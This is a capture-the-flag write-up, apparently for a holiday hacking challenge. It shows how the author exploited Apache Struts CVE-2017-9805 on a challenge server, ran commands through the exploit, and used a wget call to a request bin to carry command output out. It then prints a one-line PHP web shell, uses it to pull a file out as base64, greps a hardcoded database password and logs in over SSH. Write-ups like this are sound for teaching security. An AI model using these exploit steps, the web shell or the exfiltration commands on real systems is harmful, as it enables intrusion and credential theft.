# 1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?

Some snowball bouncing later...

![3x Conveyor](task1/snowball_1.png)

We are rewarded with [GreatBookPage1.pdf](book/GreatBookPage1.pdf). The title of the page is "About This Book...".


# 2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

Looking at the source, we find a link to the development version:
```html
<!-- Development version -->
<a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
```

The development version takes us to a "Toy Request Form", where we can add, edit and remove toy requests. It has an interesting footer:

```html
<div id="the-footer"><p class="center-it">Powered By: <a href="https://struts.apache.org/">Apache Struts</a></p></div>
<!-- Friend over at Equal-facts Inc recommended this framework-->
```
"Equal-facts" seems very likely to refer to Equifax, who was recently hacked due to an Apache Structs vulnerability [CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638). However, after "talking to" Sparkle Redberry  (aka rolling a snowball to the exit of the Winconceivable: The Cliffs of Winsanity level) we learn that the site is apperently not vulnerable to this same issue:

> That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.
> 
> -- Sparkle Redberry, Hint 6

We also confirm this by running the [metasploit module for CVE-2017-5638](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_content_type_ognl.rb) and seeing that the site does indeed not seem to be affected. Fortunately (!?) there are also other recently disclosed Structs vulnerabilites, as hinted to by the last part of Hint 6.

The second Apache Structs CVE that comes up a lot when searching for recent vulnerabilities is [CVE-2017-9805](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9805), a remote code execution flaw related to XML decoding. That it is this flaw we are supposed to use is also more or less confirmed in the next hint from Sparkle Redberry:

> Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. Here is a [useful article](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code).
>
> -- Sparkle Redberry, Hint 7

The [useful article](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code) explains to us the importance of being able to alter public exploits, then gives us [yet another public exploit](https://github.com/chrisjd20/cve-2017-9805.py). Let's see if we can get this improved version working.

After fixing some python 3 incompatablities (doing a little `string->bytes->base64->string` dance) it does seem like the exploit is working:

```
> python .\task2\cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c whoami
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
```

We can verify this by, for example, running wget/curl on site where we can monitor for requests. https://requestb.in/
make this very easy, set up a private bin and have the server wget to it:

```
> python .\task2\cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "wget https://requestb.in/[BIN_ID]?a=$(whoami)"
```

After refresing the inspect view of our request bin we see that the server did make a request, 
confirming that the exploit is working. We also find that the current user is `alabaster_snowball`:

![Task2: Exploit Working](task2/task2_exploit_working.png)

Using the same techique we can run shell commands and get their response fairly easily. It's still a
bit more annoying than we would like though. One of the earlier hints tells us there is a webshell
already on the server, why don't we find that instead?

> Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely. I just choose a really long complex file name so that no one else knows how to access it.
>
> -- Sparkle Redberry, Hint 3


Command                                                  | Response 
--------                                                 | --------
 `find -name '*.php'`                                    | `./tmp/dillydilly1337.php ./var/www/html/.b0w7Q9w081A909Y8GzA7.php ./var/www/html/.VaZQaWt70e4dVAS0g0TS.php ./var/www/html/dillydilly1337.php ./var/www/html/process.php ./var/www/html/.K2tN5T3RX2x6j2NnZ3W1.php`
 `cat ./var/www/html/.K2tN5T3RX2x6j2NnZ3W1.php | base64` | `PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFtlXSkgLiAiPC9wcmU+IjsgPz4=`

The `.K2tN5T3RX2x6j2NnZ3W1.php` seems to be a simple enough web shell:

```php
<?php echo "<pre>" . shell_exec($_GET[e]) . "</pre>"; ?>
```

We find the shell by visiting https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php. Notice that we are now 
back on the "main" site and no longer on the java-based dev domain. 


## What is the topic of The Great Book page available in the web root of the server?
The first question of the task should now be simple,
we have a shell and can run commands. Let's first find and extract the great book chapter:

```
$ ls -la
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=ls%20-la

total 1812
drwxrwxrwt 6 www-data           www-data              4096 Dec 16 10:18 .
drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
                                [...]
-rw-r--r-- 1 alabaster_snowball alabaster_snowball      56 Dec 16 03:44 .K2tN5T3RX2x6j2NnZ3W1.php
-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
                                [...]

$ base64 GreatBookPage2.pdf
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=base64%20GreatBookPage2.pdf

[...]
```

We then decode the base64 locally, giving us the [GreatBookPage2.pdf](book/GreatBookPage2.pdf)!
The topic of the Great Book is "On The Topic Of Flying Animals". We also make sure to enter
its sha1 hash (`aa814d1c25455480942cb4106e6cde84be86fb30`) on the Stocking page to add it to
our stocking.

It should also be noted that the web shell we are using is owned by the current user and created
after the level was started. This probably means we are using someone elses web shell, and not the
one hinted to in Hint 3. But oh well, what works works :).

## What is Alabaster Snowball's password?

Hint 8 again points us in the direction of the development site:

> Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.
>
> -- Sparkle Redberry, Hint 8

The first step would then be to find where on the file system that it is located. Since it's a java webapp,
let's assume it has a .jar somewhere close:

```
$ find / -name *.jar
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=find%20/%20-name%20*.jar

/usr/share/java/libintl.jar
/opt/apache-tomcat/webapps/ROOT/WEB-INF/lib/struts2-convention-plugin-2.5.12.jar
/opt/apache-tomcat/webapps/ROOT/WEB-INF/lib/commons-collections-3.2.1.jar
[...]
```

It seems like the site is located in `/opt/apache-tomcat/webapps/ROOT/`. Let's see if we are lucky
enough that we can simply grep for the password 
(see also: [How do I find all files containing specific text on Linux?
](https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux)):

```
$ grep -C 4 -rnw '/opt/apache-tomcat/webapps/ROOT/' -e 'password'
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=grep%20-C%204%20-rnw%20%27/opt/apache-tomcat/webapps/ROOT/%27%20-e%20%27password%27

[...]
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-1-    public class Connect {
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-2-            final String host = "localhost";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-3-            final String username = "alabaster_snowball";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:4:            final String password = "stream_unhappy_buy_loss";   
[...]
```

We find a password used for MySql. Judging by the hint earlier, perhaps this is also the password
for the linux user?

We can confirm this by logging in to the server via ssh:
```
peter@peter-VirtualBox:~/Desktop$ ssh alabaster_snowball@l2s.northpolechristmastown.com
alabaster_snowball@l2s.northpolechristmastown.com's password: 
Linux l2s 4.9.0-4-amd64 #1 SMP Debian 4.9.51-1 (2017-09-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Dec 16 11:08:13 2017 from 10.142.0.2
alabaster_snowball@l2s:/tmp/asnow.vZQOUSD0GKHr8q1lf97RX9cq$ 
```

Alabaster Snowball's password is `stream_unhappy_buy_loss`.
